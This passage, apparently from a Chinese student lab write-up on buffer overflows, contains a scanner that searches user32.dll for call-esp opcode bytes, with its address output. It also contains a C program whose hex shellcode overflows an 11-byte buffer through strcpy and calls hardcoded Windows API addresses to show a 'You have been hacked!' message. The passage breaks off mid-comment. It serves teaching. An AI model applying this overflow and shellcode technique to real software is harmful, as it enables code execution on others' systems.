__except (EXCEPTION_EXECUTE_HANDLER)&#123;&#125;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//	address = (int)ptr+i;</span></span><br><span class="line">			<span class="comment">//	printf(&quot;OPCODE found at 0x%x\n&quot;,address);</span></span><br><span class="line">			<span class="comment">//	done_Flag=true;</span></span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76077be7</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76078cad</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76078cb9</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76079d7f</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7607ad25</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7607dea7</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7607dffb</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7607e00b</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76080be5</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76080be9</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76080ff9</span></span><br><span class="line"><span class="comment">OPCODE found at 0x760812d1</span></span><br><span class="line"><span class="comment">OPCODE found at 0x760823a3</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7608345d</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76083e2b</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76084523</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76084ef9</span></span><br><span class="line"><span class="comment">OPCODE found at 0x760855e9</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">0</span>	<span class="number">-1</span>	In function <span class="string">&#x27;int main()&#x27;</span>:</span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">18</span>	<span class="number">17</span>	[错误] <span class="string">&#x27;__try&#x27;</span> was <span class="keyword">not</span> declared in <span class="keyword">this</span> scope</span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">28</span>	<span class="number">17</span>	[错误] <span class="string">&#x27;__except&#x27;</span> was <span class="keyword">not</span> declared in <span class="keyword">this</span> scope</span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">12</span>	<span class="number">15</span>	[警告] unused variable <span class="string">&#x27;ptr&#x27;</span> [-Wunused-variable]</span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">13</span>	<span class="number">13</span>	[警告] unused variable <span class="string">&#x27;address&#x27;</span> [-Wunused-variable]</span><br></pre></td></tr></table></figure>
-<p>原程序遇到的编译错误和警告表明有几个问题需要解决：</p>
-<ol>
-<li><p><strong><code>__try</code> 和 <code>__except</code> 未声明</strong>：这些是 Microsoft 特有的结构化异常处理（SEH）关键字，仅在特定的编译器（如 MSVC）中可用。如果您在 DevC++ 或其他非 MSVC 编译器中编译此代码，这些关键字将不可用。</p>
-</li>
-<li><p><strong>未使用的变量</strong>：警告表明 <code>ptr</code> 和 <code>address</code> 变量被声明但未使用。这可能是因为代码中有逻辑错误或不完整的实现。</p>
-</li>
-</ol>
-<p>要修复这些问题，我们可以做如下修改：</p>
-<ul>
-<li>替换 <code>__try</code> 和 <code>__except</code> 为标准的 C++ 异常处理，如果需要的话。但是，由于您的目的是扫描内存，可能不需要异常处理。</li>
-<li>确保所有声明的变量都被正确使用。</li>
-</ul>
-<p>以下是修改后的代码。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HINSTANCE hHandle = LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hHandle) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary Error!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BYTE* ptr = (BYTE*)hHandle;</span><br><span class="line">    <span class="type">uintptr_t</span> address;  <span class="comment">// 使用 uintptr_t 以兼容 64 位系统</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uintptr_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000000</span>; i++) &#123; <span class="comment">// 假定扫描的最大范围</span></span><br><span class="line">        <span class="keyword">if</span> (ptr[i] == <span class="number">0xFF</span> &amp;&amp; ptr[i + <span class="number">1</span>] == <span class="number">0xD4</span>) &#123;</span><br><span class="line">            address = (<span class="type">uintptr_t</span>)ptr + i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;OPCODE found at 0x%p\n&quot;</span>, (<span class="type">void</span>*)address);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这段代码在 <code>user32.dll</code> 中搜索特定的机器码（<code>0xFF</code> 和 <code>0xD4</code>），并打印出找到的每个地址。请记住，直接访问系统库的内存可能导致不稳定的行为，因此请小心使用。此外，这段代码可能需要在具有管理员权限的环境中运行，以获取对系统库的访问权限。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line">OPCODE found at 0x75940FBF</span><br><span class="line">OPCODE found at 0x75940FC3</span><br><span class="line">OPCODE found at 0x75940FC7</span><br><span class="line">OPCODE found at 0x75941013</span><br><span class="line">OPCODE found at 0x759410EF</span><br><span class="line">OPCODE found at 0x7594117B</span><br><span class="line">OPCODE found at 0x7594127F</span><br><span class="line">OPCODE found at 0x75941383</span><br><span class="line">OPCODE found at 0x75941CA7</span><br><span class="line">OPCODE found at 0x75941DA7</span><br><span class="line">OPCODE found at 0x75941E1B</span><br><span class="line">OPCODE found at 0x75941EA7</span><br><span class="line">OPCODE found at 0x75941F1B</span><br><span class="line">OPCODE found at 0x75941F77</span><br><span class="line">OPCODE found at 0x75941FA7</span><br><span class="line">OPCODE found at 0x759420A7</span><br><span class="line">OPCODE found at 0x75942183</span><br><span class="line">OPCODE found at 0x759421A7</span><br><span class="line">OPCODE found at 0x759422A7</span><br><span class="line">OPCODE found at 0x759423A7</span><br><span class="line">OPCODE found at 0x759424A7</span><br><span class="line">OPCODE found at 0x759425A7</span><br><span class="line">OPCODE found at 0x759426A7</span><br><span class="line">OPCODE found at 0x75942783</span><br><span class="line">OPCODE found at 0x759427A7</span><br><span class="line">OPCODE found at 0x759428A7</span><br><span class="line">OPCODE found at 0x759429A7</span><br><span class="line">OPCODE found at 0x75942AA7</span><br><span class="line">OPCODE found at 0x75942BA7</span><br><span class="line">OPCODE found at 0x75942CA7</span><br><span class="line">OPCODE found at 0x75942DA7</span><br><span class="line">OPCODE found at 0x75942EA7</span><br><span class="line">OPCODE found at 0x75942FA7</span><br><span class="line">OPCODE found at 0x759430A7</span><br><span class="line">OPCODE found at 0x759431A7</span><br><span class="line">OPCODE found at 0x759432A7</span><br><span class="line">OPCODE found at 0x759433A7</span><br><span class="line">OPCODE found at 0x759434A7</span><br><span class="line">OPCODE found at 0x759435A7</span><br><span class="line">OPCODE found at 0x759436A7</span><br><span class="line">OPCODE found at 0x759437AB</span><br><span class="line">OPCODE found at 0x7594CBA7</span><br><span class="line">OPCODE found at 0x7594CBCF</span><br><span class="line">OPCODE found at 0x7594D67B</span><br><span class="line">OPCODE found at 0x7594F437</span><br><span class="line">OPCODE found at 0x7594FA27</span><br><span class="line">OPCODE found at 0x75952433</span><br><span class="line">OPCODE found at 0x75958ADB</span><br><span class="line">OPCODE found at 0x759592F7</span><br><span class="line">OPCODE found at 0x75959F07</span><br><span class="line">OPCODE found at 0x7595A10B</span><br><span class="line">OPCODE found at 0x7595A417</span><br><span class="line">OPCODE found at 0x7595ADA7</span><br><span class="line">OPCODE found at 0x7595AEB3</span><br><span class="line">OPCODE found at 0x7595AFB7</span><br><span class="line">OPCODE found at 0x7595B0BF</span><br><span class="line">OPCODE found at 0x7595B1C7</span><br><span class="line">OPCODE found at 0x7595B2CB</span><br><span class="line">OPCODE found at 0x7595B3D3</span><br><span class="line">OPCODE found at 0x7595B6DF</span><br><span class="line">OPCODE found at 0x7595B9F3</span><br><span class="line">OPCODE found at 0x7595BAFF</span><br><span class="line">OPCODE found at 0x7595BC07</span><br><span class="line">OPCODE found at 0x7595BE13</span><br><span class="line">OPCODE found at 0x7595BF1F</span><br><span class="line">OPCODE found at 0x7595CB1F</span><br><span class="line">OPCODE found at 0x7595D70F</span><br><span class="line">OPCODE found at 0x7595D7C7</span><br><span class="line">OPCODE found at 0x7595DDDF</span><br><span class="line">OPCODE found at 0x7595DF0B</span><br><span class="line">OPCODE found at 0x7595DFD3</span><br><span class="line">OPCODE found at 0x7595E09B</span><br><span class="line">OPCODE found at 0x7595E163</span><br><span class="line">OPCODE found at 0x7595E543</span><br><span class="line">OPCODE found at 0x7595E607</span><br><span class="line">OPCODE found at 0x7595E6CF</span><br><span class="line">OPCODE found at 0x7595E797</span><br><span class="line">OPCODE found at 0x7595E857</span><br><span class="line">OPCODE found at 0x7595E913</span><br><span class="line">OPCODE found at 0x7595F097</span><br><span class="line">OPCODE found at 0x7595F0CB</span><br><span class="line">OPCODE found at 0x7595F39F</span><br><span class="line">OPCODE found at 0x7595F6EF</span><br><span class="line">OPCODE found at 0x7595F773</span><br><span class="line">OPCODE found at 0x7595F7FB</span><br><span class="line">OPCODE found at 0x7595FB23</span><br><span class="line">OPCODE found at 0x7595FBA7</span><br><span class="line">OPCODE found at 0x7596008F</span><br><span class="line">OPCODE found at 0x759600D7</span><br><span class="line">OPCODE found at 0x75960163</span><br><span class="line">OPCODE found at 0x75964AE3</span><br><span class="line">OPCODE found at 0x759677BB</span><br><span class="line">OPCODE found at 0x75968B27</span><br><span class="line">OPCODE found at 0x75969827</span><br><span class="line">OPCODE found at 0x759698EB</span><br><span class="line">OPCODE found at 0x75969AC7</span><br><span class="line">OPCODE found at 0x7596B0D3</span><br><span class="line">OPCODE found at 0x7596B7B3</span><br><span class="line">OPCODE found at 0x75970AFB</span><br><span class="line">OPCODE found at 0x759733D3</span><br><span class="line">OPCODE found at 0x759734D3</span><br><span class="line">OPCODE found at 0x759734DB</span><br><span class="line">OPCODE found at 0x759734DF</span><br><span class="line">OPCODE found at 0x759734E3</span><br><span class="line">OPCODE found at 0x759735E7</span><br><span class="line">OPCODE found at 0x759735F7</span><br><span class="line">OPCODE found at 0x759735FB</span><br><span class="line">OPCODE found at 0x75973703</span><br><span class="line">OPCODE found at 0x75973707</span><br><span class="line">OPCODE found at 0x7597370B</span><br><span class="line">OPCODE found at 0x75973917</span><br><span class="line">OPCODE found at 0x75973C27</span><br><span class="line">OPCODE found at 0x75973CEF</span><br><span class="line">OPCODE found at 0x75973D37</span><br><span class="line">OPCODE found at 0x75973E3B</span><br><span class="line">OPCODE found at 0x7597410B</span><br><span class="line">OPCODE found at 0x75974B3F</span><br><span class="line">OPCODE found at 0x759754F7</span><br><span class="line">OPCODE found at 0x75975E77</span><br><span class="line">OPCODE found at 0x75975E7B</span><br><span class="line">OPCODE found at 0x75975E7F</span><br><span class="line">OPCODE found at 0x75975E83</span><br><span class="line">OPCODE found at 0x75975E87</span><br><span class="line">OPCODE found at 0x75975E8B</span><br><span class="line">OPCODE found at 0x75975E8F</span><br><span class="line">OPCODE found at 0x75975E93</span><br><span class="line">OPCODE found at 0x75975F2F</span><br><span class="line">OPCODE found at 0x75975F5F</span><br><span class="line">OPCODE found at 0x75975FEF</span><br><span class="line">OPCODE found at 0x75976283</span><br><span class="line">OPCODE found at 0x75976407</span><br><span class="line">OPCODE found at 0x759764BF</span><br><span class="line">OPCODE found at 0x759764CB</span><br><span class="line">OPCODE found at 0x7597658F</span><br><span class="line">OPCODE found at 0x7597664F</span><br><span class="line">OPCODE found at 0x75976877</span><br><span class="line">OPCODE found at 0x759770EB</span><br><span class="line">OPCODE found at 0x75978073</span><br><span class="line">OPCODE found at 0x75978077</span><br><span class="line">OPCODE found at 0x75978153</span><br><span class="line">OPCODE found at 0x7597CDBF</span><br><span class="line">OPCODE found at 0x7597CDC3</span><br><span class="line">OPCODE found at 0x7597CDC7</span><br><span class="line">OPCODE found at 0x7597CE13</span><br><span class="line">OPCODE found at 0x7597CEEF</span><br><span class="line">OPCODE found at 0x7597CF7B</span><br><span class="line">OPCODE found at 0x7597D07F</span><br><span class="line">OPCODE found at 0x7597D183</span><br><span class="line">OPCODE found at 0x7597DAA7</span><br><span class="line">OPCODE found at 0x7597DBA7</span><br><span class="line">OPCODE found at 0x7597DC1B</span><br><span class="line">OPCODE found at 0x7597DCA7</span><br><span class="line">OPCODE found at 0x7597DD1B</span><br><span class="line">OPCODE found at 0x7597DD77</span><br><span class="line">OPCODE found at 0x7597DDA7</span><br><span class="line">OPCODE found at 0x7597DEA7</span><br><span class="line">OPCODE found at 0x7597DF83</span><br><span class="line">OPCODE found at 0x7597DFA7</span><br><span class="line">OPCODE found at 0x7597E0A7</span><br><span class="line">OPCODE found at 0x7597E1A7</span><br><span class="line">OPCODE found at 0x7597E2A7</span><br><span class="line">OPCODE found at 0x7597E3A7</span><br><span class="line">OPCODE found at 0x7597E4A7</span><br><span class="line">OPCODE found at 0x7597E583</span><br><span class="line">OPCODE found at 0x7597E5A7</span><br><span class="line">OPCODE found at 0x7597E6A7</span><br><span class="line">OPCODE found at 0x7597E7A7</span><br><span class="line">OPCODE found at 0x7597E8A7</span><br><span class="line">OPCODE found at 0x7597E9A7</span><br><span class="line">OPCODE found at 0x7597EAA7</span><br><span class="line">OPCODE found at 0x7597EBA7</span><br><span class="line">OPCODE found at 0x7597ECA7</span><br><span class="line">OPCODE found at 0x7597EDA7</span><br><span class="line">OPCODE found at 0x7597EEA7</span><br><span class="line">OPCODE found at 0x7597EFA7</span><br><span class="line">OPCODE found at 0x7597F0A7</span><br><span class="line">OPCODE found at 0x7597F1A7</span><br><span class="line">OPCODE found at 0x7597F2A7</span><br><span class="line">OPCODE found at 0x7597F3A7</span><br><span class="line">OPCODE found at 0x7597F4A7</span><br><span class="line">OPCODE found at 0x7597F5AB</span><br><span class="line">OPCODE found at 0x7599109B</span><br><span class="line">OPCODE found at 0x7599109F</span><br><span class="line">OPCODE found at 0x759929EB</span><br><span class="line">OPCODE found at 0x75993183</span><br><span class="line">OPCODE found at 0x75993CF7</span><br><span class="line">OPCODE found at 0x75993D0F</span><br><span class="line">OPCODE found at 0x7599481B</span><br><span class="line">OPCODE found at 0x75994BFB</span><br><span class="line">OPCODE found at 0x75994C9F</span><br><span class="line">OPCODE found at 0x7599595B</span><br><span class="line">OPCODE found at 0x7599595F</span><br><span class="line">OPCODE found at 0x75995E8C</span><br><span class="line">OPCODE found at 0x75995E9C</span><br><span class="line">OPCODE found at 0x75995F6C</span><br><span class="line">OPCODE found at 0x7599E18F</span><br><span class="line">OPCODE found at 0x7599FA1B</span><br><span class="line">OPCODE found at 0x759A0FCB</span><br><span class="line">OPCODE found at 0x759A261F</span><br><span class="line">OPCODE found at 0x759A2627</span><br><span class="line">OPCODE found at 0x759A270F</span><br><span class="line">OPCODE found at 0x759A4633</span><br><span class="line">OPCODE found at 0x759A4637</span><br><span class="line">OPCODE found at 0x759B2CF7</span><br><span class="line">OPCODE found at 0x759B38EF</span><br><span class="line">OPCODE found at 0x759B4CE7</span><br><span class="line">OPCODE found at 0x759B512B</span><br><span class="line">OPCODE found at 0x759BF74F</span><br><span class="line">OPCODE found at 0x759C0FDB</span><br><span class="line">OPCODE found at 0x759C258B</span><br><span class="line">OPCODE found at 0x759C3BDF</span><br><span class="line">OPCODE found at 0x759C3BE7</span><br><span class="line">OPCODE found at 0x759C3CCF</span><br><span class="line">OPCODE found at 0x759C5BF3</span><br><span class="line">OPCODE found at 0x759C5BF7</span><br><span class="line">OPCODE found at 0x759C797B</span><br><span class="line">OPCODE found at 0x759C98EB</span><br><span class="line">OPCODE found at 0x759CA1CF</span><br><span class="line">OPCODE found at 0x759E5AA9</span><br><span class="line">OPCODE found at 0x759E66DF</span><br><span class="line">OPCODE found at 0x759E6AE3</span><br><span class="line">OPCODE found at 0x759E6B6F</span><br><span class="line">OPCODE found at 0x759E6B73</span><br><span class="line">OPCODE found at 0x759EEBA3</span><br><span class="line">OPCODE found at 0x759F0D2F</span><br><span class="line">OPCODE found at 0x759F1C91</span><br><span class="line">OPCODE found at 0x759F34B7</span><br><span class="line">OPCODE found at 0x759F457D</span><br><span class="line">OPCODE found at 0x759F8929</span><br><span class="line">OPCODE found at 0x759F9253</span><br><span class="line">OPCODE found at 0x759F955F</span><br><span class="line">OPCODE found at 0x759F9963</span><br><span class="line">OPCODE found at 0x759F99EF</span><br><span class="line">OPCODE found at 0x759F99F3</span><br><span class="line">OPCODE found at 0x75A01A23</span><br><span class="line">OPCODE found at 0x75A03BAF</span><br><span class="line">OPCODE found at 0x75A06337</span><br><span class="line">OPCODE found at 0x75A073FD</span><br><span class="line">OPCODE found at 0x75A0D5BD</span><br><span class="line">OPCODE found at 0x75A105FB</span><br><span class="line">OPCODE found at 0x75A12293</span><br><span class="line">OPCODE found at 0x75A17D19</span><br><span class="line">OPCODE found at 0x75A18A67</span><br><span class="line">OPCODE found at 0x75A1AEEB</span><br><span class="line">OPCODE found at 0x75A1BF31</span><br><span class="line">OPCODE found at 0x75A1DBA1</span><br></pre></td></tr></table></figure>
-<p><code>strcy.cpp</code>程序实现</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 恶意代码的shellcode，使用十六进制表示</span></span><br><span class="line"><span class="type">char</span> name[] = <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xBF\x0F\x94\x75&quot;</span><span class="comment">//这里调用</span></span><br><span class="line"><span class="string">&quot;\x83\xEC\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x69\x6E\x67\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x57\x61\x72\x6E&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xC4&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x21\x20\x20\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x63\x6B\x65\x64&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x6E\x20\x68\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x20\x62\x65\x65&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x68\x61\x76\x65&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x59\x6F\x75\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xCC&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x51&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xB8\x10\xa1\x8f\x75&quot;</span><span class="comment">//\xB8不能改，小端存储</span></span><br><span class="line"><span class="string">&quot;\xFF\xD0&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xB8\xd0\x74\x41\x76&quot;</span> <span class="comment">//\xB8不能改，小端存储</span></span><br><span class="line"><span class="string">&quot;\xFF\xD0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> st[<span class="number">11</span>];</span><br><span class="line">		<span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="comment">// 将shellcode复制到更小的缓冲区，这可能导致缓冲区溢出</span></span><br><span class="line">	<span class="built_in">strcpy</span>(st, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,st);</span><br><span class="line">	<span class="comment">// 打印复制到缓冲区的内容</span></span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  以下是注释掉的代码，看起来像是用于动态加载库的代码片段，可能用于进一步的溢出利用</span></span><br><span class="line"><span class="comment">  &quot;\x8D\x4C\x24\x04&quot;</span></span><br><span class="line"><span class="comment">  &quot;\x83\xE4\xF0&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xFF\x71\xFC&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x55&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x89\xE5&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x51&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x83\xEC\x14&quot; </span></span><br><span class="line"><span 